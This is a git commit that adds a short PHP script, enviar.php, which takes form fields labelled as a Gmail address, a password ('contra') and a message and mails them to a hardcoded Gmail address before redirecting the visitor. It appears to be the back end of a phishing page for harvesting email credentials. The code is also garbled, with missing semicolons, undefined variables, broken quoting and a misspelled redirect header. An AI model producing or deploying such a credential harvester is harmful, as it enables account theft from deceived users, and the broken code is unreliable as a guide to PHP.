9c38cab52754a9b2b7d46f7a47923a0ba3493d8e
sorteos <68829239+Jhossteen@users.noreply.github.com>
2020-08-03 05:44:14 -0400

    Add files via upload

---
+++ enviar.php
@@ -0,0 +1,10 @@
+<?php
+  $destino= "jostin54255@gmail.com"
+  $nombre = $_post["Gmail"];
+  $nombre = $_post["contra"];
+  $nombre = $_post["mensaje"];
+  $cotenido = "Gmail: " . $Gmail . "/ncontra: " . $contra " .$mensaje;
+  mail ("$destino, "contacto", $cotenido);
+  header("Localition:bien.html");
+
+  ?>
